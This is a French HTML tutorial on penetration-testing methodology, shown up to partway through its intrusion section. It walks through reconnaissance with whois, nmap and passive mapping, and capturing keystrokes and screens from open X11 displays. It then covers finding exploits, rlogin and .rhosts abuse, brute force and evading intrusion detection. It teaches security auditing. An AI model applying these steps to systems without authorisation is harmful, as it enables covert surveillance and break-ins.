<HTML>
<HEAD>
<TITLE>Test d'intrusion, méthodologie</TITLE>
<STYLE TYPE="text/css">A {text-decoration:none; color:#5e5e5e}</STYLE>
</HEAD>
<BODY BGCOLOR=white>
<A NAME="start"></A>
<HR>
<H1><CENTER>Test d'intrusion, méthodologie</CENTER></H1>
<HR>
<H2>1. <A HREF="#1">Introduction</A></H2>
<H2>2. <A HREF="#2">R&eacute;cup&eacute;ration d'informations, 1&egrave;re reconnaissance</A></H2>
<FONT SIZE=3><B>2.1. But</B></FONT><BR>
<FONT SIZE=3><B>2.2. Logiciels utilis&eacute;s</B></FONT><BR>
<FONT SIZE=3><B>2.3. M&eacute;thode</B></FONT><BR>
<H2>3. <A HREF="#3">Identifier les failles potentielles</A></H2>
<FONT SIZE=3><B>3.1. But</B></FONT><BR>
<FONT SIZE=3><B>3.2. Logiciels utilis&eacute;s</B></FONT><BR>
<FONT SIZE=3><B>3.3. M&eacute;thode</B></FONT><BR>
<H2>4. <A HREF="#4">Eliminer les failles non-fond&eacute;es</A></H2>
<FONT SIZE=3><B>4.1. But</B></FONT><BR>
<FONT SIZE=3><B>4.2. Logiciels utilis&eacute;s</B></FONT><BR>
<FONT SIZE=3><B>4.3. M&eacute;thode</B></FONT><BR>
<H2>5. <A HREF="#5">Intrusion</A></H2>
<FONT SIZE=3><B>5.1. But</B></FONT><BR>
<FONT SIZE=3><B>5.2. Logiciels utilis&eacute;s</B></FONT><BR>
<FONT SIZE=3><B>5.3. M&eacute;thode</B></FONT><BR>
<H2>6. <A HREF="#6">R&eacute;cup&eacute;ration d'informations, 2&egrave;me reconnaissance</A></H2>
<FONT SIZE=3><B>6.1. But</B></FONT><BR>
<FONT SIZE=3><B>6.2. Logiciels utilis&eacute;s</B></FONT><BR>
<FONT SIZE=3><B>6.3. M&eacute;thode</B></FONT><BR>
<H2>7. <A HREF="#7">El&eacute;vation de privil&egrave;ges, 3&egrave;me reconnaissance</A></H2>
<FONT SIZE=3><B>7.1. But</B></FONT><BR>
<FONT SIZE=3><B>7.2. Logiciels utilis&eacute;s</B></FONT><BR>
<FONT SIZE=3><B>7.3. M&eacute;thode</B></FONT><BR>
<H2>8. <A HREF="#8">Compromission des serveurs</A></H2>
<FONT SIZE=3><B>8.1. But</B></FONT><BR>
<FONT SIZE=3><B>8.2. Logiciels utilis&eacute;s</B></FONT><BR>
<FONT SIZE=3><B>8.3. M&eacute;thode</B></FONT><BR>
<H2>9. <A HREF="#9">Fin du test, nettoyage</A></H2>
<FONT SIZE=3><B>9.1. But</B></FONT><BR>
<FONT SIZE=3><B>9.2. Logiciels utilis&eacute;s</B></FONT><BR>
<FONT SIZE=3><B>9.3. M&eacute;thode</B></FONT><BR>
<H2>10. <A HREF="#10">Conclusion</A></H2>
<H2>11. <A HREF="#11">D&eacute;charge</A></H2>
<H2>12. <A HREF="#12"><I>Copyright</I></A></H2>
<BR>
<BR>
<HR><H2>1. <A NAME="1">Introduction</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
&nbsp;Ce papier n'est qu'un guide, et n'a pas la pr&eacute;tention de parler de toutes les techniques d'intrusion. En fait, c'est plus une introduction aux m&eacute;thodes d'intrusion, destin&eacute;e aux d&eacute;butants ayant un <I>background</I> minimum d'<I>UNIX</I> et des r&eacute;seaux.<BR>
&nbsp;Peut-&ecirc;tre qu'un prochain guide de ce style parlera des techniques et m&eacute;thodes avanc&eacute;es, et d'autres protocoles que l'on peut exploiter pour obtenir des informations, et s'introduire dans des r&eacute;seaux informatiques.<BR>
<BR>
<HR><H2>2. <A NAME="2">R&eacute;cup&eacute;ration d'informations, 1&egrave;re reconnaissance</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<BR>
<BR><FONT SIZE=3><B>2.1. But</B></FONT><BR>
&nbsp;Pour &eacute;valuer le niveau de s&eacute;curit&eacute; d'un r&eacute;seau, il faut d'abord le conna&icirc;tre. La premi&egrave;re &eacute;tape est donc d'avoir une carte du r&eacute;seau cibl&eacute; pour l'auditer.<BR>
<BR>
<BR><FONT SIZE=3><B>2.2. Logiciels utilis&eacute;s</B></FONT><BR>
 Pour se faire, voici une liste des logiciels utiles:
<UL>
<LI><I>Nmap</I> (<A HREF="http://www.insecure.org/nmap/">http://www.insecure.org/nmap/</A>), un <I>scanneur</I> de ports.<BR>
<LI><I>Siphon</I> (<A HREF="http://www.subterrain.net/projects/siphon/">http://www.subterrain.net/projects/siphon/</A>), un <I>mappeur</I> de r&eacute;seaux passif (sans connexion).<BR>
<LI><I>XScan</I> (<A HREF="http://www.martnet.com/~johnny/exploits/X/xscan.c">http://www.martnet.com/~johnny/exploits/X/xscan.c</A>)<BR>
<LI><I>XSpy</I> (<A HREF="http://www.acm.vt.edu/~jmaxwell/programs/xspy/xspy.html">http://www.acm.vt.edu/~jmaxwell/programs/xspy/xspy.html</A>)<BR>
</UL>
<BR>
<BR><FONT SIZE=3><B>2.3. M&eacute;thode</B></FONT><BR>
<BR>
<BR><FONT SIZE=3><B>2.3.1. Identifier les sous-r&eacute;seaux</B></FONT><BR>
<UL>
<LI>Th&eacute;orie:<BR>
&nbsp;La premi&egrave;re chose &agrave; faire est de d&eacute;terminer quels sont les sous-r&eacute;seaux appartenant &agrave; la cible. Si l'audit &agrave; r&eacute;alis&eacute; est "autoris&eacute;", la liste des r&eacute;seaux peut &ecirc;tre communiqu&eacute;e par les instances impliqu&eacute;es dans celui-ci.<BR>
&nbsp;Sinon, on peut interroger les sites qui recensent les noms de domaines. Pour l'Europe: http://www.ripe.net, pour les Etats-Unis: http://www.arin.net/, et pour la plan&egrave;te enti&egrave;re: http://www.iana.net.<BR>
&nbsp;Une autre m&eacute;thode consiste en l'interrogation des serveurs de nom de la cible, si le transfert de zone vous est autoris&eacute;.<BR>
<LI>Pratique:<BR>
&nbsp;L'utilitaire en ligne de commande <B>whois</B> peut &eacute;galement &ecirc;tre utilis&eacute; pour obtenir des informations sur le r&eacute;seau cibl&eacute;. Les informations que l'on peut obtenir sont par exemple, les serveurs <I>DNS</I>, le nom de la personne responsable, un num&eacute;ro de t&eacute;l&eacute;phone, une adresse <I>eMail</I>, ainsi qu'une description du r&eacute;seau.<BR>
</UL>
 Exemple (l'adresse 213.36.127.5 est celle de www.chez.com):
<PRE>
freebsd$ <B>whois -h whois.ripe.net 213.36.127.5</B>
% This is the RIPE Whois server.
% The objects are in RPSL format.
% Please visit http://www.ripe.net/rpsl for more information.
% Rights restricted by copyright.
% See http://www.ripe.net/ripencc/pub-services/db/copyright.html
<BR>
inetnum:      213.36.120.0 - 213.36.127.255
netname:      LIBERTYSURF-4
descr:        Liberty Surf is a free Internet Service Provider
descr:        based in France
country:      FR
admin-c:      LTAD1-RIPE
admin-c:      ED1197-RIPE
tech-c:       LTNO1-RIPE
status:       ASSIGNED PA
remarks:      All abuse requests MUST be sent to 'abuse@libertysurf.fr'
remarks:      and the logs must include the timezone and GMT offset.
mnt-by:       MNT-LIBERTYSURFTELECOM
changed:      b.grange@libertysurf.fr 20010416
changed:      b.grange@libertysurf.fr 20010503
source:       RIPE
<BR>
route:        213.36.96.0/19
descr:        Praxitel / LibertySurf
origin:       AS12876
mnt-by:       MNT-LIBERTYSURFTELECOM
changed:      b.grange@libertysurf.fr 20000120
changed:      b.grange@libertysurf.fr 20010215
source:       RIPE
<BR>
role:         LIBERTYSURF TELECOM ABUSE DEPARTMENT
address:      Service Juridique Libertysurf
address:      10 rue Fructidor, 75834 Paris CEDEX 17, France
phone:        +33 1 41 66 46 36
fax-no:       +33 1 41 66 46 90
e-mail:       abuse@libertysurf.fr
trouble:      ***
trouble:      *** ALL ABUSE REQUESTS MUST BE SENT TO abuse@libertysurf.fr ***
trouble:      ***
trouble:      *** Les requisitions judiciaires doivent etre
trouble:      *** envoyees a cette adresse a l'attention du
trouble:      *** service juridique.
trouble:      ***
admin-c:      ED1197-RIPE
tech-c:       RL8839-RIPE
nic-hdl:      LTAD1-RIPE
mnt-by:       MNT-LIBERTYSURFTELECOM
changed:      b.grange@libertysurf.fr 20010503
source:       RIPE
<BR>
role:         LIBERTYSURF TELECOM NETWORK OPS
address:      Libertysurf Telecom, Paris
phone:        +33 1 45 08 23 28
fax-no:       +33 1 45 08 25 29
e-mail:       noc@libertysurf.net
trouble:      Questions and problem reports ... noc@libertysurf.net
trouble:      ALL ABUSE REQUESTS MUST BE SENT TO abuse@libertysurf.fr
admin-c:      ED1197-RIPE
tech-c:       BG34
nic-hdl:      LTNO1-RIPE
mnt-by:       MNT-LIBERTYSURFTELECOM
changed:      b.grange@libertysurf.fr 20010419
source:       RIPE
<BR>
person:       Eric Denoyer
address:      LibertySurf Telecom
address:      10, rue Fructidor
address:      75834 Paris CEDEX 17
phone:        +33 1 41 66 77 00
fax-no:       +33 1 41 66 77 67
e-mail:       eric.denoyer@libertysurf.fr
nic-hdl:      ED1197-RIPE
mnt-by:       MNT-LIBERTYSURFTELECOM
changed:      b.grange@libertysurf.fr 19991109
changed:      b.grange@libertysurf.fr 20010120
changed:      b.grange@libertysurf.fr 20010215
source:       RIPE
</PRE>
 La commande <B>host</B> permet d'obtenir la liste des machines enregistr&eacute;es dans les serveurs de noms de la cible:
<PRE>
freebsd$ <B>host -l chez.com</B>
Server failed: Query refused
</PRE>
&nbsp;Dans ce cas, vous n'avez pas le droit d'obtenir cette liste, mais si vous aviez &eacute;t&eacute; &agrave; l'int&eacute;rieur du r&eacute;seau de domaine <I>chez.com</I>, vous l'auriez probablement obtenue.<BR>
&nbsp;On peut &eacute;galement obtenir &eacute;norm&eacute;mement d'informations sur la cible en interrogeant les moteurs de recherche, et sp&eacute;cialement les moteurs de recherche qui <I>scannent</I> les <I>newsgroups</I> (<I>usenet</I>) sp&eacute;cialis&eacute;s.<BR>
<BR>
<BR><FONT SIZE=3><B>2.3.2. <I>Scanner</I> le r&eacute;seau</B></FONT><BR>
<UL>
<LI>Th&eacute;orie:<BR>
&nbsp;Une fois les sous-r&eacute;seaux connus, il reste &agrave; les <I>scanner</I>.<BR>
&nbsp;Le <I>scan</I> de r&eacute;seau est une &eacute;tape qui permet de savoir quelles sont les adresses <I>IP</I> valides, quels sont les ports ouverts sur ces machines (ouverts, ferm&eacute;s ou filtr&eacute;s), et &eacute;galement l'<I>OS</I> et sa version.<BR>
&nbsp;Pour cela on utilise <I>nmap</I>. Ce programme permet de <I>scanner</I> des r&eacute;seaux complets, en sp&eacute;cifiant par exemple l'adresse r&eacute;seau et son masque. L'<I>OS</I> est identifi&eacute; en analysant la r&eacute;ponse qu'est donn&eacute;e &agrave; la connexion <I>TCP</I> &agrave; un port ouvert, puis &agrave; un port ferm&eacute;. Ce n'est pas une m&eacute;thode sûre &agrave; cent pourcent, mais elle est quand m&ecirc;me tr&egrave;s efficace.<BR>
&nbsp;Il existe diff&eacute;rents type de <I>scan</I>, le plus couramment utilis&eacute; est le <I>SYN scan</I>. Il est furtif, car il n'&eacute;tabli pas une connexion <I>TCP</I> compl&egrave;te. Mais si un <I>NIDS</I> <I>logge</I> les paquets <I>TCP</I> avec le <I>flag</I> <I>SYN</I>, il sera rep&eacute;r&eacute;.<BR>
&nbsp;Une autre m&eacute;thode pour d&eacute;couvrir la topologie d'un r&eacute;seau est l'utilisation d'un <I>mappeur</I> de r&eacute;seau passif, comme <I>Siphon</I>. Il suffit d'&ecirc;tre <I>root</I> sur sa machine, et de lancer l'ex&eacute;cutable. Il ne permettra malheureusement que de d&eacute;couvrir la topologie r&eacute;seau du brin physique sur lequel votre machine se trouve.<BR>
&nbsp;Si il y a de nombreuses machines <I>UNIX</I>, on peut &eacute;galement <I>scanner</I> le r&eacute;seau pour les connexions <I>X</I> possibles depuis d'autres machines. Ceci permet, entre autres, de capturer les &eacute;crans des machines vuln&eacute;rables, de capturer la frappe de l'utilisateur, ou m&ecirc;me de regarder les fen&ecirc;tres de la victime en temps r&eacute;el.<BR>
<LI>Pratique:<BR>
</UL>
<B><I>Nmap</I>:</B><BR>
&nbsp;Pour <I>scanner</I> un r&eacute;seau du type: <I>192.168.0.0/24</I>, l'adresse r&eacute;seau &eacute;tant donc 192.168.0, et ce sous-r&eacute;seau poss&egrave;de jusqu'&agrave; 255 machines (le masque &eacute;tant sur 24 bits). L'adresse <I>IP</I> pr&eacute;c&eacute;dente n'&eacute;tant pas forc&eacute;ment de classe C, puisque le masque peut &ecirc;tre sp&eacute;cifi&eacute;, gr&acirc;ce aux extensions <I>CIDR</I>, en restant conforme aux standards propos&eacute;s (voir <I>RFC1517, RFC1518, RFC1519</I>).<BR>
<PRE>
freebsd# <B>nmap -sS -sU -O -oN trace.log 192.168.0.1-254</B>
<BR>
Starting nmap V. 2.54BETA25 ( www.insecure.org/nmap/ )
Interesting ports on agathon (192.168.0.2):
(The 3108 ports scanned but not shown below are in state: closed)
Port       State       Service
22/tcp     open        ssh                     
111/tcp    open        sunrpc                  
111/udp    open        sunrpc                  
137/udp    open        netbios-ns              
138/udp    open        netbios-dgm
139/tcp    open        netbios-ssn             
514/udp    open        syslog                  
518/udp    open        ntalk                   
919/udp    open        unknown                 
988/udp    open        unknown                 
991/udp    open        unknown                 
1003/udp   open        unknown                 
1007/udp   open        unknown                 
1011/udp   open        unknown                 
1019/tcp   open        unknown                 
1020/tcp   open        unknown                 
1021/tcp   open        unknown                 
1021/udp   open        unknown                 
1022/tcp   open        unknown                 
1023/tcp   open        unknown                 
2049/tcp   open        nfs                     
2049/udp   open        nfs                     
<BR>
Remote operating system guess: FreeBSD 4.3
<BR>
Nmap run completed -- 1 IP address (1 host up) scanned in 24 seconds
</PRE>
&nbsp;La sortie de ce programme ne montre que le r&eacute;sultat du <I>scan</I> d'une machine.<BR>
&nbsp;Le param&egrave;tre <I>-sS</I> sp&eacute;cifie le type de <I>scan</I> (ici un <I>SYN scan</I>), le param&egrave;tre <I>-sU</I> sp&eacute;cifie de <I>scanner</I> &eacute;galement les ports <I>UDP</I>, l'option <I>-O</I> permet de tenter l'identification de l'<I>OS</I> de la machine cibl&eacute;e, le param&egrave;tre <I>-oN</I> sauvegarde la sortie de l'ex&eacute;cution de la commande dans un fichier <I>trace.log</I>, et le dernier param&egrave;tre sp&eacute;cifie qu'il faut <I>scanner</I> de cette mani&egrave;re toutes les machines du r&eacute;seau 192.168.0.<BR>
&nbsp;Le script fourni dans l'annexe A permet de <I>scanner</I> tous les r&eacute;seaux sp&eacute;cifi&eacute;s dans un fichier fourni an param&egrave;tre.<BR>
<B><I>Siphon</I>:</B><BR>
<PRE>
freebsd# <B>siphon -v -i xl0 -o siphon.log</B>
<BR>
	[ The Siphon Project: The Passive Network Mapping Tool ]
		[ Copyright (c) 2000 Subterrain Security Group ]
<BR>
<BR>
Running on: 'freebsd.domain.org' running FreeBSD 4.3-RELEASE on a(n) i386
<BR>
Using Device: xl0
<BR>
Host				Port	TTL		DF		Operating System
<BR>
192.168.77.171		139		128		ON		2238
192.168.38.8		21		255		ON		Solaris 2.6 - 2.7
192.168.132.127		139		128		ON		2238
10.208.175.71		80		59		ON		16D0
192.168.39.202		139		128		ON		2238
10.208.175.70		80		59		ON		16D0
192.168.112.112		139		128		ON		2238
192.168.12.10		139		128		ON		2238
192.168.132.230		631		60		OFF		16D0
192.168.38.8		7		255		ON		Solaris 2.6 - 2.7
192.168.38.8		13		255		ON		Solaris 2.6 - 2.7
192.168.38.8		19		255		ON		Solaris 2.6 - 2.7
</PRE>
&nbsp;Le programme n'a pas tourn&eacute; tr&egrave;s longtemps pour cet exemple. Mais plus longtemps il trounera, plus vous aurez d'informations. A l'aide de la sortie de ce programme, vous pouvez conna&icirc;tre l'<I>OS</I> d'une machine, ainsi que les ports qui sont ouverts sur cette machine, et m&ecirc;me quelles sont les machines ayant le droit de se connecter &agrave; ces ports. Cette derni&egrave;re information est tr&egrave;s importante, puiqu'elle permet de savoir pour quelle machine, ou quel r&eacute;seau, vous allez devoir vous faire passer pour contourner les protections bas&eacute;es sur l'adresse <I>IP</I> (telles que les <I>TCP Wrappers</I>, ou bien les <I>firewalls</I>).<BR>
<B><I>XScan & XSpy</I>:</B><BR>
&nbsp;Le premier programme permet de trouver les machines vuln&eacute;rables (celles dont les utilisateurs ont probablement ex&eacute;cut&eacute; la commande <B>xhost +</B>), et la deuxi&egrave;me permet de capturer la frappe au clavier de ces machines.<BR>
&nbsp;Pour <I>scanner</I> le r&eacute;seau 192.168.1/24<BR>
<PRE>
freebsd$ <B>./xscan 192.168.1 -s</B>
xscan v1.1      X11 connection scanner     xygorf 1997
scanning 192.168.1.1 to 192.168.1.1 on port 6000
Trying 192.168.1.1...Invalid argument
Trying 192.168.1.2...Invalid argument
Trying 192.168.1.3...Invalid argument
...
Trying 192.168.1.41...Invalid argument
Trying 192.168.1.42...Invalid argument
Trying 192.168.1.43...Socket is already connected
Trying 192.168.1.44...Connect Timeout
Trying 192.168.1.45...Invalid argument
</PRE>
&nbsp;La ligne contenant <I>"Socket is already connected"</I> signifie que cette machine est vuln&eacute;rable. Si la connexion <I>X</I> utilise les <I>MIT MAGIC COOKIES</I>, il faut d'abord r&eacute;cup&eacute;rer la cl&eacute; en <I>sniffant</I> (avec <I>DSniff</I>, par exemple).<BR>
<PRE>
freebsd$ <B>./xspy -display vulnerable_host:0</B>
ls
who
rlogin -l user01 <I>host</I> 
<I>passwd</I>
</PRE>
&nbsp;Un programme livr&eacute; en standard avec <I>X</I> est <B>xwd</B>. Il permet de capturer le <I>DISPLAY</I> des machines vuln&eacute;rables.<BR>
<PRE>
freebsd$ <B>/usr/X11R6/bin/xwd -display vulnerable_host:0 -root -out file.dmp</B>
freebsd$ <B>/usr/X11R6/bin/xwud -in file.dmp</B>
</PRE>
<BR>
<BR><FONT SIZE=3><B>2.3.3. Recherche d'informations compl&eacute;mentaires</B></FONT><BR>
&nbsp;Une fois le <I>scan</I> du r&eacute;seau termin&eacute;, une quantit&eacute; d'informations est &agrave; extraire des fichiers de <I>log</I>s. Par exemple, on peut rechercher le serveur <I>DNS</I> en regardant la ou les machines qui ont le port 53 ouvert. De m&ecirc;me pour le serveur de courriels, en regardant la ou les machines qui ont le port 25 ouvert.<BR>
&nbsp;On peut &eacute;galement explorer les partages <I>NFS</I> (port 2049) et <I>NetBIOS</I> (port 139) pour acqu&eacute;rir d'autres informations, telles qu'une liste de comptes valides (en cherchant le partage <B>/var/mail</B>, g&eacute;rant le courriel des utilisateurs), et que des fichiers r&eacute;cup&eacute;r&eacute;s dans ces partages.<BR>
&nbsp;Le service <I>finger</I> permet &eacute;galement d'obtenir des comptes valides. C'est pour cette raison que bien souvent, l'acc&egrave;s &agrave; ce service est restreint par les <I>TCP Wrappers</I>, et qu'il faut avoir recours, soit &agrave; l'<I>IP Spoofing</I>, soit au <I>finger forwarding</I> pour obtenir ces informations.<BR>
&nbsp;Le service <I>sendmail</I> permet &eacute;galement l'obtention de comptes valides par <I>brute force</I>, si les commandes <I>SMTP</I> <I>EXPN</I> et <I>VRFY</I> n'ont pas &eacute;t&eacute; d&eacute;sactiv&eacute;es.<BR>
<BR>
<HR><H2>3. <A NAME="3">Identifier les failles potentielles</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<BR>
<BR><FONT SIZE=3><B>3.1. But</B></FONT><BR>
&nbsp;Une fois la topologie du r&eacute;seau cible bien connue (<I>OS</I>, ports ouverts, nombre de machines accessibles depuis l'ext&eacute;rieur du r&eacute;seau), il reste a identifier les failles qui seront utilis&eacute;es pour p&eacute;n&eacute;trer dans le r&eacute;seau. Ceci se fait en exploitant les failles distantes.<BR>
<BR>
<BR><FONT SIZE=3><B>3.2. Logiciels utilis&eacute;s</B></FONT><BR>
 Il n'y a pas vraiment de logiciel plus utile qu'un autre. On peut quand m&ecirc;me citer des <I>scanneurs</I> de vuln&eacute;rabilit&eacute;s:
<UL>
<LI><I>Nessus</I> (<A HREF="http://www.nessus.org/">http://www.nessus.org/</A>)<BR>
<LI><I>SAINT</I> (<A HREF="http://www.wwdsi.com/saint/">http://www.wwdsi.com/saint/</A>)<BR>
</UL>
&nbsp;Mais l'utilisation de ces logiciels n'est pas conseill&eacute;e si la discr&eacute;tion est de rigueur, puisque ces logiciels testent des failles bien connues des <I>NIDS</I>.<BR>
 La m&eacute;thode la plus utile une fois le r&eacute;seau bien <I>mapp&eacute;</I> est l'interrogation de sites qui maintiennent une base de donn&eacute;es des vuln&eacute;rabilit&eacute;s d&eacute;couvertes, en recherchant des informations sur les services auxquels on peut acc&eacute;der depuis l'ext&eacute;rieur du r&eacute;seau cible:
<UL>
<LI><I>SecurityFocus</I>: <A HREF="http://www.securityfocus.com">http://www.securityfocus.com</A><BR>
<LI><I>SecuriTeam</I>: <A HREF="http://www.securiteam.com/exploits/">http://www.securiteam.com/exploits/</A><BR>
<LI><I>LSD</I>: <A HREF="http://www.lsd-pl.net/vulnerabilities.html">http://www.lsd-pl.net/vulnerabilities.html</A><BR>
<LI><I>Uberhax0r</I>: <A HREF="http://www.uberhax0r.net/exploits/os/">http://www.uberhax0r.net/exploits/os/</A><BR>
<LI><I>Technotronic</I>: <A HREF="ftp://ftp.technotronic.com/unix/">ftp://ftp.technotronic.com/unix/</A><BR>
<LI><I>Insecure</I>: <A HREF="http://www.insecure.org/sploits.html">http://www.insecure.org/sploits.html</A><BR>
<LI><I>LSD</I>: <A HREF="http://www.lsd-pl.net/vulnerabilities.html">http://www.lsd-pl.net/vulnerabilities.html</A><BR>
<LI><I>Hack.co.za</I>: <A HREF="http://www.hack.co.za/">http://www.hack.co.za/</A><BR>
<LI><I>Google</I>: <A HREF="http://www.google.com/">http://www.google.com/</A><BR>
<LI>Sur <I>IRC</I><BR>
</UL>
<BR>
<BR><FONT SIZE=3><B>3.3. M&eacute;thode</B></FONT><BR>
<UL>
<LI>Th&eacute;orie:<BR>
&nbsp;Rechercher dans les sites pr&eacute;c&eacute;dents les &eacute;ventuelles vuln&eacute;rabilit&eacute;s des services accessibles depuis le r&eacute;seau ext&eacute;rieur, et faire la liste des machines &eacute;tant susceptibles d'&ecirc;tre exploit&eacute;es par ces failles.<BR>
&nbsp;Sur des <I>channels IRC</I> de l'<I>underground</I>, on peut &eacute;galement obtenir des informations sur des vuln&eacute;rabilit&eacute;s non-encore divulg&eacute;es, &agrave; condition de conna&icirc;tre des personnes int&eacute;ressantes.<BR>
<LI>Pratique:<BR>
&nbsp;Cette &eacute;tape est tr&egrave;s importante, une bonne organisation est n&eacute;cessaire. On peut par exemple noter dans un fichier texte les vuln&eacute;rabilit&eacute;es potentielles concernant les machines du r&eacute;seau. Il faudra ensuite v&eacute;rifier que ces possibles trous de s&eacute;curit&eacute; sont fond&eacute;s.<BR>
 Exemple: Sur le site <A HREF="http://www.securityfocus.com/">http://www.securityfocus.com/</A>:
<UL>
<LI>Dans la partie gauche, cliquer sur <I>Vulnerabilities</I><BR>
<LI>Choisir ensuite le type de recherche en cliquant sur un des onglets de la partie centrale (<I>By vendor</I>, <I>By title</I>, <I>By keyword</I> ...)<BR>
<LI>En prenant par exemple <I>By keyword</I>, et en entrant comme mot cl&eacute; <I>solaris</I>, on obtient une liste de vuln&eacute;rabilit&eacute;s d&eacute;couvertes pour cet <I>OS</I>.<BR>
</UL>
</UL>
<BR>
<HR><H2>4. <A NAME="4">Eliminer les failles non-fond&eacute;es</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<BR>
<BR><FONT SIZE=3><B>4.1. But</B></FONT><BR>
&nbsp;Toutes les failles trouv&eacute;es concernant les <I>OS</I> et les services du r&eacute;seau &agrave; auditer dans l'&eacute;tape pr&eacute;c&eacute;dente ne sont pas fond&eacute;es, c'est-&agrave;-dire qu'il faut v&eacute;rifier que ces services ou programmes sont r&eacute;ellement vuln&eacute;rables. Cette &eacute;tape permet d'&eacute;liminer une grande partie des fausses alertes.<BR>
&nbsp;A la fin de cette &eacute;tape, seules les failles exploitables doivent subsister.<BR>
<BR>
<BR><FONT SIZE=3><B>4.2. Logiciels utilis&eacute;s</B></FONT><BR>
&nbsp;Ici non-plus il n'y a pas vraiment de logiciels pour cela. Il faut tester les vuln&eacute;rabilit&eacute;s &agrave; l'aide de petits programmes, appel&eacute;s <I>exploit</I>s, sur les machines potentiellement vuln&eacute;rables. C'est une &eacute;tape plus ou moins longue, selon que le r&eacute;seau est compos&eacute; de nombreuses machines avec de nombreux <I>OS</I> diff&eacute;rents, ou de nombreuses versions de ces <I>OS</I>.<BR>
&nbsp;Les sites <I>SecurityFocus</I>, <I>SecuriTeam</I> et <I>Google</I> peuvent &ecirc;tre int&eacute;rrog&eacute;s pour trouver ces programmes, ainsi que les autres sites list&eacute;s dans la section pr&eacute;c&eacute;dente.<BR>
&nbsp;On peut rechercher dans les <I>channels IRC</I> dans le monde de l'<I>underground</I>, pour trouver des <I>exploits</I> non divulgu&eacute;s. Mais il faut se m&eacute;fier des programmes &eacute;cris par d'autres <I>hacker</I>s, il vaut mieux regarder le source de pr&egrave;s.<BR>
<BR>
<BR><FONT SIZE=3><B>4.3. M&eacute;thode</B></FONT><BR>
&nbsp;Chaque vuln&eacute;rabilit&eacute; a sa propre technique d'exploitation. C'est pour cette raison qu'aucun programme pour automatiser ce genre de chose n'existe encore aujourd'hui. Il peut exister, par contre, des biblioth&egrave;ques d'<I>exploits</I>, qu'il faut remettre &agrave; jour en permanence, d&egrave;s qu'une nouvelle vuln&eacute;rabilit&eacute; est d&eacute;couverte.<BR>
&nbsp;Nous allons faire un exemple avec le service <I>snmp</I>, de <I>Solaris 7 & 8</I>.<BR>
&nbsp;Il est &agrave; noter que c'est un exemple de vuln&eacute;rabilit&eacute; r&eacute;seau. Un plus grand nombre de vuln&eacute;rabilit&eacute;s locales existe pour les syst&egrave;mes <I>Solaris</I>.<BR>
<UL>
<LI>Th&eacute;orie:<BR>
&nbsp;Si une machine ex&eacute;cute le service <I>snmpXdmid</I> de chez <I>Sun</I>, et que c'est une version vuln&eacute;rable &agrave; un d&eacute;bordement de tampon, il faut trouver un <I>exploit</I> pour cette version du <I>daemon</I> <I>snmp</I>.<BR>
<LI>Pratique:<BR>
&nbsp;Une fois l'<I>exploit</I> trouv&eacute; (par exemple sur le site de <I>SecurityFocus</I>), il suffit de compiler le programme, et de l'ex&eacute;cuter contre la machine &agrave; tester. Si vous obtenez un <I>shell</I> <I>root</I>, c'est que la machine est vuln&eacute;rable. Il faut alors <I>patcher</I> la vuln&eacute;rabilit&eacute;, ou bien utiliser un <I>workaround</I> en attendant que celui-ci soit disponible.<BR>
</UL>
&nbsp;L'exemple pr&eacute;c&eacute;dent est donc &agrave; r&eacute;p&eacute;ter pour toutes les vuln&eacute;rabilit&eacute;s potentielles d&eacute;couvertes pendant l'&eacute;tape de recherche de failles.<BR>
<BR>
<HR><H2>5. <A NAME="5">Intrusion</A><FONT SIZE=1><A HREF="#start"> retour</A></FONT></H2>
<BR>
<BR><FONT SIZE=3><B>5.1. But</B></FONT><BR>
&nbsp;Maintenant, il faut s'introduire dans le r&eacute;seau cible pour continuer la collecte d'informations. Cette &eacute;tape se fait par exemple en exploitant les faiblesses des commandes <I>R*</I> de <I>Berkeley</I>, ou en exploitant une faille de s&eacute;curit&eacute; r&eacute;seau (cf. exemple pr&eacute;c&eacute;dent).<BR>
&nbsp;Si aucune des techniques pr&eacute;c&eacute;dentes ne marchent, il reste la possibilit&eacute; d'une intrusion par <I>brute force</I>, pour cela il faut trouver des comptes valides sur le r&eacute;seau, probablement obtenus dans l'&eacute;tape de reconnaissance, ou &eacute;galement par <I>brute force</I>, en exploitant les faiblesses de configuration de <I>sendmail</I> par exemple (qui permet d'obtenir des comptes valides).<BR>
<BR>
<BR><FONT SIZE=3><B>5.2. Logiciels utilis&eacute;s</B></FONT><BR>
<UL>
<LI><I>NetCat</I> (rechercher sur <I>Google</I>)<BR>
<LI><I>Find Rlogin</I> (programme dans l'annexe A)<BR>
<LI>Exploitation des faiblesses de <I>Sendmail</I> et utilisation des programmes standards <I>UNIX</I> tels que <I>finger</I> et <I>rusers</I> pour trouver des comptes valides<BR>
<LI>Des sources d'<I>exploit</I>s, trouv&eacute; sur <I>Internet</I><BR>
</UL>
<BR>
<BR><FONT SIZE=3><B>5.3. M&eacute;thode</B></FONT><BR>
<UL>
<LI>Th&eacute;orie:<BR>
&nbsp;Dans notre base de donn&eacute;es d'informations sur le r&eacute;seau, il ne reste plus maintenant que les machines qui ont des services vuln&eacute;rables. Il suffit donc d'exploiter leurs faiblesses afin d'acquerir un acc&egrave;s <I>shell</I> au r&eacute;seau de la cible. Il y a de fortes chances que cet acc&egrave;s soit directement un acc&egrave;s <I>root</I>.<BR>
&nbsp;Si une liste de comptes valides a &eacute;t&eacute; obtenue, on peut utiliser <B>rlogin</B> pour se connecter au r&eacute;seau en utilisant soit un mot de passe nul (pas de mot de passe du tout), soit le m&ecirc;me mot de passe que le nom de <I>login</I>, soit esp&eacute;rer que la personne &agrave; qui appartient le compte a mis un <I>+</I> dans son fichier <B>~/.rhosts</B>. Le programme <I>Find RLogin</I> a &eacute;t&eacute; developp&eacute; pour accomplir cette t&acirc;che.<BR>
&nbsp;Bien sur, si le service <I>rlogin</I> n'est pas accessible depuis l'ext&eacute;rieur du r&eacute;seau, vous pouvez avoir recours au <I>spoofing</I>, et &agrave; l'utilitaire <I>NetCat</I> pour contourner cala.<BR>
<LI>Pratique:<BR>
&nbsp;Le programme <I>Find RLogin</I> prends comme param&egrave;tre un fichier contenant une liste de comptes (un par ligne). Il existe diff&eacute;rentes m&eacute;thodes pour obtenir une liste de comptes valides. La plus triviale est de trouver le partage <I>NFS</I> g&eacute;rant le courrier des utilitateurs (comme expliqu&eacute; dans l'&eacute;tape de reconnaissance).<BR>
